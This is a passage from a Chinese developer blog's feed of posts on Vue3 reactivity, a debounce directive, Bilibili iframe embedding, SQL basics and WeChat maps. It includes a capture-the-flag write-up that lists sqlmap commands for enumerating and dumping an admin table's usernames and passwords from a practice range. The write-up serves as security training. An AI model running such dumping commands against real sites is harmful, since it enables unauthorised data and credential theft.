class="line">**注意：ref 和 shallowRef 不要同时写，否则会影响 shallowRef,造成视图更新**</span><br><span class="line"></span><br><span class="line"><span class="string">``</span><span class="string">`typescript</span></span><br><span class="line"><span class="string"> &lt;script setup lang=&quot;ts&quot;&gt;</span></span><br><span class="line"><span class="string">import &#123; shallowRef, triggerRef &#125; from &#x27;vue&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">const count2 = shallowRef(&#123; a: 0 &#125;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">const changeCount = () =&gt; &#123;</span></span><br><span class="line"><span class="string">  // 以下修改不会触发视图更新</span></span><br><span class="line"><span class="string">  // count2.value.a++</span></span><br><span class="line"><span class="string">  // 加上triggerRef就可以触发视图更新，强制触发</span></span><br><span class="line"><span class="string">  // triggerRef(count2)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  // 响应式修改，会触发视图更新</span></span><br><span class="line"><span class="string">  count2.value = &#123;</span></span><br><span class="line"><span class="string">    a: 10</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;template&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;</span></span><br><span class="line"><span class="string">      非响应式数据,点击不可更新视图:</span></span><br><span class="line"><span class="string">      &lt;button @click=&quot;count2.a++&quot;&gt;shallowRef: &#123;&#123; count2.a &#125;&#125;&lt;/button&gt;</span></span><br><span class="line"><span class="string">    &lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;</span></span><br><span class="line"><span class="string">      响应式数据,点击可以更新视图:</span></span><br><span class="line"><span class="string">      &lt;button @click=&quot;changeCount&quot;&gt;shallowRef: &#123;&#123; count2.a &#125;&#125;&lt;/button&gt;</span></span><br><span class="line"><span class="string">    &lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;/template&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;style scoped&gt;&lt;/style&gt;</span></span><br></pre></td></tr></table></figure>
<h1>isRef 和 unref</h1>
<blockquote>
<p>isRef ：检查值是否为一个 ref 对象。</p>
<p>unref：如果参数是一个 ref，则返回内部值，否则返回参数本身。</p>
</blockquote>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; ref, isRef, unref &#125; <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> count = <span class="title function_">ref</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">count.<span class="property">value</span>++;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;判断是否是 ref 响应式数据&quot;</span>, <span class="title function_">isRef</span>(count)); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;获取原始数据&quot;</span>, <span class="title function_">unref</span>(count)); <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>vue</category>
        <category>ref</category>
        <category>vue3</category>
      </categories>
      <tags>
        <tag>vue3</tag>
      </tags>
  </entry>
  <entry>
    <title>vue3自定义指令</title>
    <url>/Vue/vue3%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4/</url>
    <content><![CDATA[<p>我们使用 vue 时，有时候需要用到自定义指令，例如一个防抖指令</p>
<hr>
<h1>前言</h1>
<p>现在有一个需求，用户在点击某个按钮时，我不希望用户在疯狂点击后，每次点击都会触发事件，像服务器发送请求，这并不是我们预期的，所以我们需要在用户点击是做防抖处理。那么怎么做到方便复用的解决方法？还真有，那就是自己定义指令</p>
<h1>一、在 main 中使用自定义指令</h1>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> useDebounce <span class="keyword">from</span> <span class="string">&#x27;@/hooks/useDebounce&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">createApp</span>(<span class="title class_">App</span>)</span><br><span class="line">app.<span class="title function_">directive</span>(<span class="string">&#x27;debounce&#x27;</span>, useDebounce)</span><br></pre></td></tr></table></figure>
<p>下面是 <strong>useDebounce</strong>  代码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 防抖指令</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> el 指令绑定的元素</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> binding 指令绑定的值</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> binding.value.callback 回调函数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> binding.value.params 回调函数参数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> binding.value.delay 延迟时间</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@example</span></span></span><br><span class="line"><span class="comment"> * &lt;button v-debounce=&quot;&#123;callback: handleLike, params: &#123; test: 0 &#125;&#125;&quot;&gt;防抖&lt;/button&gt; handleLike 为函数 params 为传入的参数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="title function_">mounted</span>(<span class="params">el: HTMLElement, binding: &#123; value: &#123; callback: <span class="built_in">Function</span>; params?: any; delay?: number &#125; &#125;</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="attr">timer</span>: <span class="title class_">ReturnType</span>&lt;<span class="keyword">typeof</span> <span class="built_in">setTimeout</span>&gt; | <span class="literal">null</span> = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line">    el.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">(<span class="params">e: Event</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// 阻止默认事件</span></span><br><span class="line">      e.<span class="title function_">preventDefault</span>()</span><br><span class="line">      <span class="comment">// 阻止冒泡</span></span><br><span class="line">      e.<span class="title function_">stopPropagation</span>()</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (timer) &#123;</span><br><span class="line">        <span class="built_in">clearTimeout</span>(timer)</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">let</span> delay = binding.<span class="property">value</span>?.<span class="property">delay</span> || <span class="number">1000</span></span><br><span class="line"></span><br><span class="line">      timer = <span class="built_in">setTimeout</span>(</span><br><span class="line">        <span class="function">() =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">const</span> &#123; callback, params &#125; = binding.<span class="property">value</span></span><br><span class="line">          <span class="comment">// callback 不是函数</span></span><br><span class="line">          <span class="keyword">if</span> (!callback || <span class="keyword">typeof</span> callback !== <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;callback is not a function&#x27;</span>)</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="title function_">callback</span>(params ? params : e)</span><br><span class="line">          <span class="comment">// 重置计时器</span></span><br><span class="line">          timer = <span class="literal">null</span></span><br><span class="line">        &#125;,delay )</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>二、在页面中使用</h1>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">v-debounce</span>=<span class="string">&quot;&#123;callback: handleClick , params: &#123; test: 0 &#125;&#125;&quot;</span>&gt;</span>点击我<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span> <span class="attr">lang</span>=<span class="string">&quot;ts&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="comment">// 你的函数</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">const</span> <span class="title function_">handleClick</span> = (<span class="params">&#123; test &#125;: &#123; test: number &#125;</span>) =&gt; &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;防抖函数&quot;</span>,test);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="comment">// ... 这里写你组件的逻辑</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<h1>结尾</h1>
<p>最后，如果你觉得写法不对，欢迎指教</p>
]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>网页内嵌B站视频，隐藏相关控件</title>
    <url>/Vue/%E7%BD%91%E9%A1%B5%E5%86%85%E5%B5%8CBilibili%E8%A7%86%E9%A2%91/</url>
    <content><![CDATA[<p>网页内嵌 B 站视频主要是用 <strong>ifame</strong> , 其地址是：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">https://player.bilibili.com/player.html?cid=&amp;aid=84267566&amp;page=1&amp;as_wide=1&amp;high_quality=1&amp;danmaku=0</span><br></pre></td></tr></table></figure>
<p>后面的参数说明：</p>
<table>
<thead>
<tr>
<th style="text-align:left">key</th>
<th style="text-align:left">属性</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">cid</td>
<td style="text-align:left">应该是客户端iid，可以不填</td>
</tr>
<tr>
<td style="text-align:left">aid</td>
<td style="text-align:left">视频id，必填</td>
</tr>
<tr>
<td style="text-align:left">page</td>
<td style="text-align:left">B站视频, 选集里的, 第几个视频 ————默认值为）</td>
</tr>
<tr>
<td style="text-align:left">as_wide</td>
<td style="text-align:left">是否宽屏 1: 宽屏, 0: 小屏</td>
</tr>
<tr>
<td style="text-align:left">high_quality</td>
<td style="text-align:left">是否高清</td>
</tr>
<tr>
<td style="text-align:left">danmaku</td>
<td style="text-align:left">是否开启弹幕 1: 开启(默认), 0: 关闭</td>
</tr>
</tbody>
</table>
<blockquote>
<p>其中 <strong>aid</strong> 为必填，其它参数可以不填</p>
</blockquote>
<p>这个 aid 怎么获取呢？这就需要请求 B 站这个接口了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">https://api.bilibili.com/x/web-interface/view?bvid=BV1gY4y1E7h8</span><br></pre></td></tr></table></figure>
<h1>1、aid获取</h1>
<p>bvid怎么获取？在 B站播放视频中的 url 里我们可以看到</p>
<p><img src="https://img-blog.csdnimg.cn/123702207ba7477ea7dfaa3f029d545b.png" alt="在这里插入图片描述"></p>
<p>如果网页上传 链接提取的话就需要先去访问上面的地址获取视频 aid</p>
<p><img src="https://img-blog.csdnimg.cn/a2c048bd934d45f2a61f9d31787c0af8.png" alt="在这里插入图片描述"></p>
<p>我们可以叫后端去访问，前端提供 bvid，后端去请求 B 站获取 aid 的地址，根据所得内容返回给前端</p>
<h1>2、封装</h1>
<p>这里以 vue 为例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;iframe-box&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;vedio&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">iframe</span></span></span><br><span class="line"><span class="tag">        <span class="attr">class</span>=<span class="string">&quot;vedio-iframe&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">:src</span>=<span class="string">&quot;src&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">frameborder</span>=<span class="string">&quot;no&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">scrolling</span>=<span class="string">&quot;no&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">danmaku</span>=<span class="string">&quot;0&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">allowfullscreen</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">id</span>=<span class="string">&quot;iframe&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">sandbox</span>=<span class="string">&quot;allow-top-navigation allow-same-origin allow-forms allow-scripts&quot;</span></span></span><br><span class="line"><span class="tag">      &gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>ifame参数说明：</p>
<table>
<thead>
<tr>
<th style="text-align:left">key</th>
<th style="text-align:left">属性</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">allowfullscreen</td>
<td style="text-align:left">设置true为时，可以通过调用 iframe 的requestFullscreen()方法激活全屏模式</td>
</tr>
<tr>
<td style="text-align:left">scrolling</td>
<td style="text-align:left">这个属性控制是否要在框架内滚动显示  auto: 当框架的内容超出范围时显示的滚动条。yes: 实时显示滚动条。no: 从不显示滚动条。</td>
</tr>
<tr>
<td style="text-align:left">frameborder</td>
<td style="text-align:left">此属性1值时显示，此框架的默认0使用屏幕</td>
</tr>
<tr>
<td style="text-align:left">…</td>
<td style="text-align:left">…</td>
</tr>
</tbody>
</table>
<p>这里就不在多详述了，可以参考这个 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/iframe">iframe </a></p>
<p>js部分代码:</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">&lt;script setup lang=<span class="string">&quot;ts&quot;</span> name=<span class="string">&quot;iframe&quot;</span>&gt;</span><br><span class="line"><span class="keyword">import</span> ( ref ) <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> props = <span class="title function_">defineProps</span>(&#123;</span><br><span class="line">  <span class="attr">cid</span>: &#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="title class_">String</span>,</span><br><span class="line">    <span class="attr">default</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">aid</span>: &#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="title class_">String</span>,</span><br><span class="line">    <span class="attr">default</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">page</span>: &#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="title class_">String</span>,</span><br><span class="line">    <span class="attr">default</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">as_wide</span>: &#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="title class_">String</span>,</span><br><span class="line">    <span class="attr">default</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">high_quality</span>: &#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="title class_">String</span>,</span><br><span class="line">    <span class="attr">default</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">danmaku</span>: &#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="title class_">String</span>,</span><br><span class="line">    <span class="attr">default</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; cid, aid, page, as_wide, high_quality, danmaku &#125; = props;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> baseURL = <span class="string">&quot;https://player.bilibili.com/player.html?&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> src = ref&lt;<span class="title class_">String</span>&gt;(<span class="string">`<span class="subst">$&#123;baseURL&#125;</span>cid=<span class="subst">$&#123;cid&#125;</span>&amp;aid=<span class="subst">$&#123;aid&#125;</span>&amp;page=<span class="subst">$&#123;page&#125;</span>&amp;as_wide=<span class="subst">$&#123;as_wide&#125;</span>&amp;high_quality=<span class="subst">$&#123;high_quality&#125;</span>&amp;danmaku=<span class="subst">$&#123;danmaku&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>css部分代码：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;style lang=&quot;scss&quot; scoped&gt;</span><br><span class="line"><span class="selector-class">.iframe-box</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100vh</span>;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.vedio</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  // 因为要隐藏下面的提示，所有多加 <span class="number">40px</span>, 如果要隐藏控件就多加 <span class="number">30px</span></span><br><span class="line">  <span class="attribute">height</span>: <span class="built_in">calc</span>(<span class="number">100vh</span> + <span class="number">40px</span>);</span><br><span class="line">  <span class="attribute">min-height</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.vedio-iframe</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">border</span>: none;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>
<p>最终结果：</p>
<p><img src="https://img-blog.csdnimg.cn/0bb793441a3941b7a639dd79274f18d5.png" alt="在这里插入图片描述"></p>
<p>原本不去除下边的样子 ：</p>
<p><img src="https://img-blog.csdnimg.cn/6cca658ddb0a4495b1fc28e011003ac3.png" alt="在这里插入图片描述"></p>
<p>目前只知道怎么隐藏下面，其它的暂时不懂，因为获取不到 iframe 中的元素，无法修改其样式</p>
<blockquote>
<p>图片打不开的话 f12 控制台打开，可能跨域访问失败了</p>
</blockquote>
]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL笔记</title>
    <url>/Sql/sql%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1>学习目标：</h1>
<p>SQL:的基本语法，遗忘可以回来查看</p>
<hr>
<h2 id="一、创建数据库">一、创建数据库</h2>
<blockquote>
<p>CREATE DATABASE &lt;数据库名&gt;<br>
[ AUTHORIZATION &lt;用户名&gt; ]<br>
[ ON[ PRIMARY] (路径//文件大小) ]<br>
[ LOG ON (路径/文件大小) ]</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> database name <span class="keyword">on</span> (   	<span class="comment">-- name 数据库名称</span></span><br><span class="line">	name <span class="operator">=</span> <span class="string">&#x27;name&#x27;</span>，				<span class="comment">-- &#x27;name&#x27; 数据库名称</span></span><br><span class="line">	filename <span class="operator">=</span> <span class="string">&#x27;F:\test.mdf&#x27;</span>, 	<span class="comment">-- 路径地址</span></span><br><span class="line">	size <span class="operator">=</span> <span class="number">10</span>,					<span class="comment">-- 设置大小（非必须）</span></span><br><span class="line">	maxsize<span class="operator">=</span> <span class="number">50</span>,				<span class="comment">-- 最大值（非必须）</span></span><br><span class="line">	filegrowth <span class="operator">=</span> <span class="number">5</span><span class="operator">%</span>,			<span class="comment">-- 数据文件的增长速度 （非必须）</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">-- 创建日志文件（连上面）</span></span><br><span class="line">log <span class="keyword">on</span> (</span><br><span class="line">	name <span class="operator">=</span> name_log,			<span class="comment">-- 日志名称</span></span><br><span class="line">	filename <span class="operator">=</span> <span class="string">&#x27;F:\test.ldf&#x27;</span>    <span class="comment">-- 日志文件路径</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<h2 id="二、-修改数据库">二、 修改数据库</h2>
<blockquote>
<p>ALTER DATABASE &lt;数据库名&gt;<br>
MODIFY NAME | FILE = &lt;数据库名称/文件名&gt;</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>SQL</category>
      </categories>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>封神台 第一章：为了女神小芳！SQL注入攻击原理 实战演练</title>
    <url>/Web/%E5%B0%81%E7%A5%9E%E5%8F%B0-%E7%AC%AC%E4%B8%80%E7%AB%A0%EF%BC%9A%E4%B8%BA%E4%BA%86%E5%A5%B3%E7%A5%9E%E5%B0%8F%E8%8A%B3%EF%BC%81SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86-%E5%AE%9E%E6%88%98%E6%BC%94%E7%BB%83/</url>
    <content><![CDATA[<p>封神台是一个在线演练靶场，本人现在也是新手，不知道是不是因为有些教程有点久远还是我操作不当，始终拿不到 flag ，所有我打算把我的解题方法写出来，加深记忆。</p>
<p>因为第一章的教程是没有问题的，纯手打就可以拿到 flag , 可以直接参考即可，为此我的教程是使用工具获取 flag ，本文要使用工具为 sqlmap ,什么是sqlmap? 简单来说就是一个 sql注入工具，如果要详细了解，可以看这篇文章: <a href="https://www.freebuf.com/sectool/164608.html">https://www.freebuf.com/sectool/164608.html</a> ,这里就不多介绍了，我用 kail 自带的 sqlmap：</p>
<p>sqlmap下载地址：<a href="https://sqlmap.org/">https://sqlmap.org/</a></p>
<p>主要命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;目标地址&quot; -D 库名 -T 表名  -C 字段名 -dump </span><br></pre></td></tr></table></figure>
<p>1、打开sqlmap：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap</span><br></pre></td></tr></table></figure>
<p>2、扫描目标地址，判断有无注入点:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u  http://rhiq8003.ia.aqlab.cn/?id=1</span><br></pre></td></tr></table></figure>
<p>3、查看当前库名：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://rhiq8003.ia.aqlab.cn/?id=1 --current-db</span><br></pre></td></tr></table></figure>
<p>4、查看指定库下面的所有表名：</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://rhiq8003.ia.aqlab.cn/?id=1 -D maoshe --tables  </span><br></pre></td></tr></table></figure>
<p>5、可以看出，这 admin 明显就是我们要找的数据库表，那么下面来查看指定库中的表中的所有字段名：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://rhiq8003.ia.aqlab.cn/?id=1 -D maoshe -T admin --columns  </span><br></pre></td></tr></table></figure>
<p>6、查看所有字段内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://rhiq8003.ia.aqlab.cn/?id=1 -D maoshe -T admin -C username,password -dump</span><br></pre></td></tr></table></figure>
<p>最后得出 flag :hellohack ,菜鸟自学， 如有不足，欢迎指教。</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>小程序简单使用map组件</title>
    <url>/wechat/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8map%E7%BB%84%E4%BB%B6/</url>
    <content><![CDATA[<p>小程序简单使用map组件</p>
<hr>
<h1>一、wxml</h1>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;map&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">map</span>    </span></span><br><span class="line"><span class="tag">  <span class="attr">id</span>=<span class="string">&quot;map&quot;</span> </span></span><br><span class="line"><span class="tag">  <span class="attr">style</span>=<span class="string">&quot;width: 100%;height: 100%;&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">longitude</span>=<span class="string">&quot;&#123;&#123;longitude&#125;&#125;&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">latitude</span>=<span class="string">&quot;&#123;&#123;latitude&#125;&#125;&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">markers</span>=<span class="string">&quot;&#123;&#123;markers&#125;&#125;&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">scale</span>=<span class="string">&quot;&#123;&#123;scale&#125;&#125;&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">show-location</span></span></span><br><span class="line"><span class="tag">&gt;</span><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h1>二、wxss</h1>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.map</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100vw</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100vh</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>三、JS</h1>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Page</span>(&#123;</span><br><span class="line">    <span class="attr">data</span>: &#123;</span><br><span class="line">        <span class="attr">longitude</span>:<span class="string">&quot;&quot;</span>,   <span class="comment">// 中心经度</span></span><br><span class="line">        <span class="attr">latitude</span>:<span class="string">&quot;&quot;</span>,    <span class="comment">// 中心纬度</span></span><br><span class="line">        <span class="attr">markers</span>:[],     <span class="comment">// 标记点</span></span><br><span class="line">        <span class="attr">scale</span>:<span class="number">10</span>        <span class="comment">// 缩放级别，取值范围为3-20</span></span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="attr">onLoad</span>: <span class="keyword">function</span> (<span class="params">options</span>) &#123;</span><br><span class="line">        <span class="comment">// 获取当前地理位置</span></span><br><span class="line">        wx.<span class="title function_">getLocation</span>(&#123;</span><br><span class="line">            <span class="attr">success</span>:<span class="function">(<span class="params">res</span>)=&gt;</span>&#123;</span><br><span class="line">                <span class="keyword">let</span> &#123;latitude,longitude&#125; = res;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="title function_">setData</span>(&#123;</span><br><span class="line">                    latitude,</span><br><span class="line">                    longitude</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 自定义markers</span></span><br><span class="line">    <span class="title function_">getMarkers</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// 假设请求数据返回 markers</span></span><br><span class="line">        <span class="comment">// ......</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">setData</span>(&#123;</span><br><span class="line">            <span class="attr">markers</span>:[&#123;</span><br><span class="line">                <span class="attr">joinCluster</span>:<span class="literal">true</span>,   <span class="comment">// 是否点聚合</span></span><br><span class="line">                <span class="attr">iconPath</span>:<span class="string">&quot;/images/login.png&quot;</span>,  <span class="comment">// 项目目录下的图片路径</span></span><br><span class="line">                <span class="attr">longitude</span>:“<span class="number">131.29</span>”, <span class="comment">// 经度</span></span><br><span class="line">                <span class="attr">latitude</span>:“<span class="number">78.21</span>”,  <span class="comment">// 纬度</span></span><br><span class="line">                <span class="attr">width</span>:<span class="number">30</span>,  <span class="comment">// 标注图标宽度</span></span><br><span class="line">                <span class="attr">height</span>:<span class="number">30</span>, <span class="comment">// 标注图标高度</span></span><br><span class="line">                <span class="attr">callout</span>:&#123;  <span class="comment">// 标记点上方的气泡窗口</span></span><br><span class="line">                    <span class="attr">content</span>:<span class="string">&quot;文本&quot;</span>,  <span class="comment">// 文本</span></span><br><span class="line">                    <span class="attr">color</span>:<span class="string">&quot;red&quot;</span>,    <span class="comment">// 文本颜色</span></span><br><span class="line">                    <span class="attr">fontSize</span>:<span class="number">24</span>,    <span class="comment">// 文本大小</span></span><br><span class="line">                    <span class="attr">borderRadius</span>:<span class="number">10</span>, <span class="comment">// 边框圆角</span></span><br><span class="line">                    <span class="attr">bgColor</span>:<span class="string">&quot;bule&quot;</span>, <span class="comment">// 背景色</span></span><br><span class="line">                    <span class="attr">padding</span>:<span 